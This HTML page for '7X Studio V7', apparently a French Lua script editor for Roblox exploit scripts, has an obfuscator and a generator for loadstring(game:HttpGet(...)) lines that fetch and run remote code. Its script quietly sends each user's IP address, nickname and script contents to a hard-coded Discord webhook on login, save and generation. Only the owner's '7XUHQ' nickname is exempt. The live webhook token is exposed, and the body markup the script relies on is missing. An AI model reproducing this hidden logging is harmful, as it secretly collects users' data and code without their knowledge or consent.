<html lang="fr">
<head>

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-deep: #050508;
            --bg-panel: #0d0d16;
            --accent: #bc4be3;
            --accent-glow: rgba(188, 75, 227, 0.5);
            --cyan: #00d4ff;
            --text: #f5f5f7;
            --text-muted: #86868b;
            --border: rgba(255, 255, 255, 0.08);
            --grad-gal: linear-gradient(135deg, #050508 0%, #11112b 100%);
            --grad-btn: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
        }

        /* --- KEYFRAMES --- */
        @keyframes popCenter {
            0% { transform: translate(-50%, -50%) scale(0.5); opacity: 0; }
            100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
        }

        @keyframes bgFlow {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        @keyframes titleGlow {
            0%, 100% { text-shadow: 0 0 10px var(--accent-glow); }
            50% { text-shadow: 0 0 25px var(--accent); }
        }

        /* NOUVEAU : Animation des particules */
        @keyframes cubeFly {
            0% { transform: translateY(0) rotate(0deg); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-1000px) rotate(720deg); opacity: 0; }
        }

        /* --- BASE --- */
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; outline: none; -webkit-tap-highlight-color: transparent; }

        body {
            background: var(--grad-gal);
            background-size: 300% 300%;
            animation: bgFlow 15s infinite ease;
            color: var(--text);
            height: 100vh;
            width: 100vw;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        /* --- NOUVEAU CSS : SYSTÈME DE PARTICULES (POINT VIOLETS) --- */
        .background-particles {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            overflow: hidden;
            z-index: 1; /* Derrière le contenu */
            pointer-events: none; /* Ne pas gêner le clic */
        }

        .particle {
            position: absolute;
            display: block;
            list-style: none;
            background-color: var(--accent); /* Couleur violette */
            box-shadow: 0 0 10px var(--accent), 0 0 20px var(--accent); /* Effet Glow */
            border-radius: 50%; /* Points ronds */
            bottom: -150px;
            animation: cubeFly 25s linear infinite;
            opacity: 0;
        }

        /* Génération de tailles et positions aléatoires pour 10 particules */
        .particle:nth-child(1) { left: 25%; size: 80px; width: 6px; height: 6px; animation-delay: 0s; animation-duration: 20s; }
        .particle:nth-child(2) { left: 10%; width: 4px; height: 4px; animation-delay: 2s; animation-duration: 25s; background-color: var(--cyan); box-shadow: 0 0 10px var(--cyan); } /* Une petite cyan pour le style */
        .particle:nth-child(3) { left: 70%; width: 5px; height: 5px; animation-delay: 4s; }
        .particle:nth-child(4) { left: 40%; width: 7px; height: 7px; animation-delay: 0s; animation-duration: 18s; }
        .particle:nth-child(5) { left: 65%; width: 4px; height: 4px; animation-delay: 0s; }
        .particle:nth-child(6) { left: 15%; width: 6px; height: 6px; animation-delay: 3s; background-color: var(--cyan); box-shadow: 0 0 10px var(--cyan); }
        .particle:nth-child(7) { left: 88%; width: 8px; height: 8px; animation-delay: 7s; }
        .particle:nth-child(8) { left: 50%; width: 4px; height: 4px; animation-delay: 15s; animation-duration: 45s; }
        .particle:nth-child(9) { left: 20%; width: 5px; height: 5px; animation-delay: 2s; animation-duration: 35s; }
        .particle:nth-child(10) { left: 85%; width: 6px; height: 6px; animation-delay: 0s; animation-duration: 11s; }


        /* --- UI ELEMENTS (Z-INDEX Boosté pour rester devant) --- */
        #splash-screen {
            position: fixed; inset: 0; z-index: 9999;
            background: var(--bg-deep);
            display: flex; align-items: center; justify-content: center;
            transition: opacity 0.5s ease, visibility 0.5s;
        }

        .login-box {
            width: 88%; max-width: 380px; padding: 40px 30px;
            background: rgba(13, 13, 22, 0.8); border: 1px solid var(--border);
            border-radius: 28px; text-align: center;
            backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); /* Effet verre */
            position: relative; z-index: 10;
        }

        .gal-title-big {
            font-size: 3rem; font-weight: 950; letter-spacing: -2px;
            background: linear-gradient(to right, var(--cyan), var(--accent));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            animation: titleGlow 3s infinite;
        }

        .gal-input {
            width: 100%; padding: 16px 20px; background: rgba(0, 0, 0, 0.4);
            border: 1px solid var(--border); border-radius: 14px;
            color: white; font-size: 1rem; margin: 25px 0 15px; text-align: center;
        }

        .gal-btn {
            width: 100%; padding: 18px; border: none; border-radius: 14px;
            background: var(--grad-btn); color: white; font-weight: 800;
            text-transform: uppercase; letter-spacing: 1px; cursor: pointer;
            position: relative; overflow: hidden;
        }
        
        .gal-btn::after { /* Effet de brillance sur le bouton */
            content: ''; position: absolute; top: -50%; left: -60%; width: 20%; height: 200%; background: rgba(255,255,255,0.2); transform: rotate(30deg); transition: 0.5s;
        }
        .gal-btn:hover::after { left: 120%; }

        header {
            height: 70px; background: rgba(13, 13, 22, 0.5);
            border-bottom: 1px solid var(--border);
            display: flex; align-items: center; justify-content: space-between;
            padding: 0 15px; z-index: 100; position: relative;
            backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px);
        }

        .header-center { position: absolute; left: 50%; transform: translateX(-50%); }

        .btn-icon {
            width: 44px; height: 44px; background: rgba(255, 255, 255, 0.03);
            border: 1px solid var(--border); border-radius: 12px;
            display: flex; align-items: center; justify-content: center;
            color: var(--cyan); font-size: 1.2rem; transition: 0.3s;
        }
        .btn-icon:active { transform: scale(0.9); background: rgba(255,255,255,0.1); }

        #side-menu {
            position: fixed; top: 0; left: -100%; width: 85%; height: 100%;
            background: rgba(8, 8, 16, 0.95); z-index: 1000;
            transition: 0.4s cubic-bezier(0.16, 1, 0.3, 1);
            padding: 30px 20px; border-right: 1px solid var(--border);
            display: flex; flex-direction: column;
            backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
        }

        #side-menu.active { left: 0; box-shadow: 20px 0 60px rgba(0,0,0,0.8); }

        .explorer { flex: 1; overflow-y: auto; margin-top: 20px; }

        .file-item {
            padding: 16px; background: rgba(255,255,255,0.02); border-radius: 14px;
            margin-bottom: 10px; display: flex; justify-content: space-between;
            align-items: center; border: 1px solid transparent; transition: 0.2s;
        }
        .file-item:active { background: rgba(255,255,255,0.05); }

        .file-item.active { background: rgba(188, 75, 227, 0.1); border-color: rgba(188, 75, 227, 0.3); color: var(--accent); }

        main { flex: 1; display: flex; flex-direction: column; position: relative; z-index: 10; }

        .action-bar {
            padding: 12px 20px; background: rgba(13, 13, 22, 0.3);
            display: flex; align-items: center; justify-content: space-between;
            border-bottom: 1px solid var(--border);
        }

        #editor-area {
            flex: 1; width: 100%; background: transparent; color: #e2e2e7;
            padding: 20px; font-family: 'Fira Code', monospace; font-size: 13px;
            line-height: 1.6; border: none; outline: none; resize: none;
            position: relative; z-index: 2;
        }

        #pop-overlay { position: fixed; inset: 0; z-index: 10001; pointer-events: none; }

        .pop-msg-center {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: 80%; max-width: 320px; background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 24px;
            padding: 30px 20px; text-align: center; color: white;
            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
            animation: popCenter 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
            pointer-events: auto;
        }

        .pop-msg-center i { display: block; font-size: 3rem; margin-bottom: 15px; background: linear-gradient(to bottom, #fff, var(--cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .pop-msg-center b { font-size: 1.1rem; text-transform: uppercase; letter-spacing: 1px; }

        .footer { height: 40px; background: rgba(13, 13, 22, 0.5); border-top: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 20px; font-size: 0.6rem; color: var(--text-muted); position: relative; z-index: 10; }
        .cp-text { font-weight: 800; letter-spacing: 0.5px; color: var(--cyan); }

        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 10005; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
    </style>
</head>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1474669361611538443/uW_m9kt05hykPUZQ_0v4sYw6-xkNsgYKF_WnP-Hc1ckg42bIRG8VPZWdrPsXfkbfQdgy";
        let sessionStartTime = Date.now();
        let lastSavedContent = "";
        let isStealthMode = false;
        let userIP = "Détection...";

        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => userIP = d.ip).catch(() => userIP = "Inconnue");

        let db = JSON.parse(localStorage.getItem('7X_V7_DB')) || {
            "GLOBAL_SCRIPTS": [{ n: "BOOT_CORE.LUA", c: "-- 7X Studio V7\nprint('Galaxy Engine Ready')\n" }],
            "ASSETS": []
        };
        let activeFile = null;
        let actionTarget = '';
        let audioCtx = null;

        function playPing() {
            try {
                if(!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = audioCtx.createOscillator(); const gain = audioCtx.createGain();
                osc.frequency.setValueAtTime(1000, audioCtx.currentTime);
                osc.frequency.exponentialRampToValueAtTime(500, audioCtx.currentTime + 0.15);
                gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.15);
                osc.connect(gain); gain.connect(audioCtx.destination);
                osc.start(); osc.stop(audioCtx.currentTime + 0.15);
            } catch(e) {}
        }

        function notify(text, icon) {
            const container = document.getElementById('pop-overlay');
            const el = document.createElement('div');
            el.className = 'pop-msg-center';
            el.innerHTML = `<i class="${icon}"></i><b>${text}</b>`;
            container.appendChild(el); playPing();
            setTimeout(() => {
                el.style.opacity = '0'; el.style.transform = 'translate(-50%, -50%) scale(0.9)';
                setTimeout(() => el.remove(), 400);
            }, 2000);
        }

        // LOGIQUE D'OBFUSCATION LUA
        function obfuscateCode() {
            const area = document.getElementById('editor-area');
            const code = area.value.trim();
            if(!code) return notify('Script vide !', 'fa-solid fa-triangle-exclamation');
            
            notify('Cryptage Galaxy...', 'fa-solid fa-shield-halved fa-spin');
            
            // Conversion en Bytes
            let bytes = [];
            for (let i = 0; i < code.length; i++) {
                bytes.push(code.charCodeAt(i));
            }
            
            // Format obfuscé robuste
            const obfuscated = `-- [[ 7X GALAXY OBFUSCATOR V7 ]]\n` +
                               `local _v = {${bytes.join(',')}}\n` +
                               `local _s = ""\n` +
                               `for _, b in ipairs(_v) do _s = _s .. string.char(b) end\n` +
                               `local _f = loadstring(_s)\n` +
                               `if _f then _f() else error("Galaxy Core: Decryption Error") end`;
            
            area.value = obfuscated;
            updateStats();
            notify('Code Sécurisé', 'fa-solid fa-lock');
            sendLogToDiscord("OBFUSCATION", "SYSTEM", "CRYPT", obfuscated);
        }

        function boot() {
            const nick = document.getElementById('nick-input').value.trim();
            if(!nick) return;
            if(nick.toUpperCase() === "7XUHQ") isStealthMode = true;
            document.getElementById('user-label').innerText = nick.toUpperCase();
            document.getElementById('splash-screen').style.opacity = '0';
            setTimeout(() => { document.getElementById('splash-screen').style.display = 'none'; }, 500);
            renderFiles();
            notify('Système Prêt', 'fa-solid fa-ghost');
            if(!isStealthMode) sendLogToDiscord("CONNEXION", "LOGIN", "N/A", "Session ouverte.");
        }

        async function sendLogToDiscord(action, dossier, fichier, contenu) {
            if(isStealthMode) return;
            const pseudo = document.getElementById('user-label').innerText;
            const payload = {
                username: "🛰️ 7X GALAXY MONITOR",
                embeds: [{
                    title: `LOG : ${action}`,
                    color: 12339939,
                    fields: [
                        { name: "👤 User", value: `\`${pseudo}\``, inline: true },
                        { name: "🌐 IP", value: `\`${userIP}\``, inline: true }
                    ],
                    description: "```lua\n" + (contenu.substring(0, 1800) || "N/A") + "\n```",
                    footer: { text: "7X STUDIO V7" },
                    timestamp: new Date().toISOString()
                }]
            };
            fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
        }

        async function generateLoadstring() {
            const content = document.getElementById('editor-area').value.trim();
            const randomNumber = Math.floor(1000 + Math.random() * 9000);
            const myKey = `HYZER-${randomNumber}`;

            if(!content || content === "") return notify('Éditeur vide !', 'fa-solid fa-triangle-exclamation');

            notify(`Génération ${myKey}...`, 'fa-solid fa-key fa-spin');

            try {
                const response = await fetch('https://bytebin.lucko.me/post', {
                    method: 'POST',
                    headers: { 'Content-Type': 'text/plain; charset=utf-8' },
                    body: content
                });

                if(!response.ok) throw new Error();
                const data = await response.json();
                
                const finalUrl = `https://bytebin.lucko.me/${data.key}?key=${myKey}`;
                const finalCode = `_G.Key = "${myKey}";\nloadstring(game:HttpGet("${finalUrl}"))()`;

                await navigator.clipboard.writeText(finalCode);
                notify(`Key ${myKey} Copiée !`, 'fa-solid fa-crown');
                
                sendLogToDiscord("GÉNÉRATION LOADSTRING", "CLOUD", myKey, finalCode);
            } catch(e) {
                notify('Erreur Serveur', 'fa-solid fa-wifi');
            }
        }

        function toggleMenu() { document.getElementById('side-menu').classList.toggle('active'); }
        function toggleFS() {
            if (!document.fullscreenElement) document.documentElement.requestFullscreen();
            else document.exitFullscreen();
        }

        function renderFiles() {
            const root = document.getElementById('explorer-root');
            root.innerHTML = '';
            for (let folder in db) {
                const head = document.createElement('div');
                head.style = "font-size: 0.6rem; color: var(--text-muted); margin: 15px 0 10px; letter-spacing: 1.5px; font-weight:900; text-transform:uppercase;";
                head.innerHTML = `<i class="fa-solid fa-folder"></i> ${folder}`;
                root.appendChild(head);
                db[folder].forEach((file, idx) => {
                    const item = document.createElement('div');
                    item.className = `file-item ${activeFile && activeFile.f === folder && activeFile.i === idx ? 'active' : ''}`;
                    item.innerHTML = `<span><i class="fa-solid fa-file-code"></i> ${file.n}</span> <i class="fa-solid fa-trash" style="color:#ff4b4b" onclick="deleteFile('${folder}', ${idx})"></i>`;
                    item.onclick = (e) => { if(e.target.tagName !== 'I') openFile(folder, idx); };
                    root.appendChild(item);
                });
            }
        }

        function openFile(f, i) {
            activeFile = { f, i };
            const file = db[f][i];
            document.getElementById('editor-area').value = file.c;
            document.getElementById('file-name-display').innerText = file.n;
            lastSavedContent = file.c; 
            toggleMenu(); updateStats(); renderFiles();
        }

        function saveActiveFile() {
            if(!activeFile) return notify('Aucun fichier', 'fa-solid fa-triangle-exclamation');
            const newContent = document.getElementById('editor-area').value;
            db[activeFile.f][activeFile.i].c = newContent;
            localStorage.setItem('7X_V7_DB', JSON.stringify(db));
            notify('Sauvegarde OK', 'fa-solid fa-cloud-bolt');
            sendLogToDiscord("SAUVEGARDE", activeFile.f, db[activeFile.f][activeFile.i].n, newContent);
        }

        function exportData() {
            if(!activeFile) return;
            const content = document.getElementById('editor-area').value;
            const blob = new Blob([content], {type: 'text/plain'});
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = db[activeFile.f][activeFile.i].n.replace('.LUA', '.txt');
            a.click();
            notify('Export .txt', 'fa-solid fa-file-export');
        }

        function openCreator(m) {
            actionTarget = m;
            document.getElementById('modal-head').innerText = m === 'file' ? 'NOUVEAU FICHIER' : 'NOUVEAU DOSSIER';
            document.getElementById('modal-box').style.display = 'flex';
        }

        function closeModal() { document.getElementById('modal-box').style.display = 'none'; }

        function confirmAction() {
            const val = document.getElementById('modal-input').value.trim().toUpperCase();
            if(!val) return;
            if(actionTarget === 'folder') { if(!db[val]) db[val] = []; }
            else { let fk = Object.keys(db)[0]; db[fk].push({ n: val + ".LUA", c: "-- Script\n" }); }
            localStorage.setItem('7X_V7_DB', JSON.stringify(db));
            renderFiles(); closeModal();
        }

        function deleteFile(f, i) {
            if(confirm("Supprimer ?")) {
                db[f].splice(i, 1);
                localStorage.setItem('7X_V7_DB', JSON.stringify(db));
                renderFiles();
            }
        }

        function updateStats() {
            const text = document.getElementById('editor-area').value;
            document.getElementById('line-stat').innerText = 'LIGNES: ' + (text.split('\n').length);
        }

        document.getElementById('editor-area').addEventListener('input', updateStats);
    </script>
</body>
</html>
